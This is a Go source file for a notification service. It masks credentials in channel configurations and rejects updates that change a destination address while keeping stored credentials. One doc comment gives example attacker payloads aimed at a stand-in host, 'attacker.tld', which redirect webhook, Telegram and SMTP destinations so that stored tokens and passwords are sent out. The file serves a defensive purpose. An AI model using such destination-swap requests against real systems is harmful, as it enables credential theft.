package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the sentinel prefix for masked values. When the API echoes credentials, real values are replaced
// with strings starting with this prefix; when the update endpoint receives a value with this prefix, it treats it as "keep the existing database value unchanged".
//
// Using a prefix rather than an empty string or a fixed constant allows us to attach a small identifying hint
// (see MaskedValue) so operators can tell which bot is which without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked representation of a secret:
//
//	"__masked__"              original value is too short; no hint given
//	"__masked__:…ab12cd"      includes the last 6 characters of the original value as an identifying hint
//
// Exposing only the last 6 characters is deliberate: the distinguishing part of a Webhook URL lies at the tail
// (such as a WeCom key or Feishu bot ID), whereas the prefix is identical across bots and offers no identification value.
// Six trailing characters are not enough to reconstruct the credential, but enough for the operator to recognize which group it belongs to.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked sentinel (i.e., echoed by the API and left unmodified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of cfg with the channel's credential fields replaced by masked values.
//
// Returns an empty map rather than the raw config when the channel kind is unknown—it is far safer for the UI to show
// an empty configuration than to dump potentially credential-bearing raw data when a channel kind is unrecognized.
// Non-credential fields are preserved as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential unit: checking individual sub-keys would require
		// each channel to declare another set of rules for which sub-keys are secrets, adding complexity far beyond the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indicates that "the destination address changed, but the caller did not explicitly
// provide values for the credential fields". Returning this error instead of silently allowing the update or silently dropping credentials
// is explained in PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Destination keys that changed
	Missing []string // Credential keys not explicitly provided
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-enter credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide a new value, or explicitly leave empty if credentials are no longer needed. " +
		"Existing credentials are only valid for the old address; keeping them would send them to the new address."
}

// PrepareConfigUpdate merges channel configuration while guarding against the security-sensitive "destination address change" scenario.
//
// It replaces bare MergeConfig on the channel update path to close a practical exfiltration vector:
// destination addresses (where messages go) and credentials (what identity is used) are separate fields, and MergeConfig
// preserves existing database values for any unmentioned or masked keys. Without this check, anyone who can PATCH a channel
// could **change only the destination address while leaving credentials untouched**, tricking the server into sending real credentials
// from the database to an attacker-controlled endpoint:
//
//	webhook  {config:{url:"https://attacker.tld"}}      → original Authorization header sent to new URL
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real-token>/sendMessage sent to attacker
//	email    {config:{host:"smtp.attacker.tld"}}        → username and password handed over after STARTTLS
//
// This vector is completely silent, does not rely on HTTP redirects (so blocking cross-host redirects cannot stop it),
// and directly defeats the goal of configuration masking ("never echo credentials back to the browser").
//
// Rule: whenever any destination key is changed to a new value, the caller must explicitly state the intent for **every** credential key:
//   - Provide a new value → use the new value
//   - Explicitly pass an empty string → credentials no longer needed for this field (preserves clear semantics)
//   - Echo back a masked value / omit the key entirely → reject
//
// The third case is rejected because a masked value specifically means "keep using the old credential", whereas the old credential
// was only authorized for the old destination. We intentionally do not "silently drop credentials"—for optional credential fields
// (webhook headers, email password), that would silently strip authentication while returning HTTP 200, which is much harder to debug than an explicit error.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as the webhook headers object) contains a masked sentinel literal inside it,
	// the caller has embedded a "keep existing value" sentinel inside a nested structure. MergeConfig only recognizes top-level strings
	// with the prefix as masked values, so a nested sentinel would be stored verbatim in the database—persisting the literal
	// "__masked__" and silently breaking authentication without any error. Reject it upfront.
	//
	// This check must run **at the very beginning**: when the destination address has not changed, the function returns early below,
	// so placing this check later would only cover the destination-changed branch.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Identify destination keys that actually changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Destination unchanged: perform a normal merge (masked values keep stored values, empty strings delete keys, others overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Destination changed: require explicit values for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the masked sentinel inside non-string structures.
//
// The masking mechanism assumes the entire field value is a string. Object fields like webhook headers
// can only be masked as a whole (as the string "__masked__") or submitted as a whole; embedding the sentinel inside the object
// cannot express "keep individual sub-key unchanged" and would instead be persisted as a literal string.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains masked sentinel %q inside a nested structure: this field must either be left masked as a whole to keep existing values or submitted with complete new values",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two configuration values are equivalent. Comparing via JSON serialization handles
// numeric type differences—e.g. a port submitted by the frontend may be an int in Go tests while the database value unmarshals as float64,
// where direct `==` comparison would falsely report a change.
//
// "Blank" values must be normalized before comparison: an empty string and a missing key represent the exact same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and deletes the key. Without normalization, an optional destination field
// left blank (Telegram's base_url is the prime example: leaving it blank uses the official API endpoint) would hit this failure sequence:
//
//	Created with base_url:""  →  first save deletes the key via MergeConfig
//	→ second save receives incoming "" while stored lacks the key, judged as "destination changed"
//	→ credential is still the masked value → HTTP 400 "destination address has changed, please re-enter credential fields"
//
// Every subsequent save would fail unless the user re-pasted the Bot Token, even though nothing was changed.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a configuration value is considered "blank".
// Its definition must match MergeConfig's clear condition (strings.TrimSpace(s) == ""),
// otherwise a gap would arise where MergeConfig deletes a key that sameConfigValue considers non-empty.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored when updating channel configuration.
//
// Rules:
//   - Keys in incoming with a masked value → preserve the original value in stored (user did not modify this field)
//   - Keys in incoming with an empty string → treat as explicit clear and delete the key
//   - All other keys in incoming → overwrite with incoming's value
//   - Keys present in stored but omitted from incoming → preserve (partial update semantics)
//
// Why an empty string means "clear": when a user wants to remove a previously configured optional field (such as a signing secret),
// submitting an empty field in the web form is the natural way to express that.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
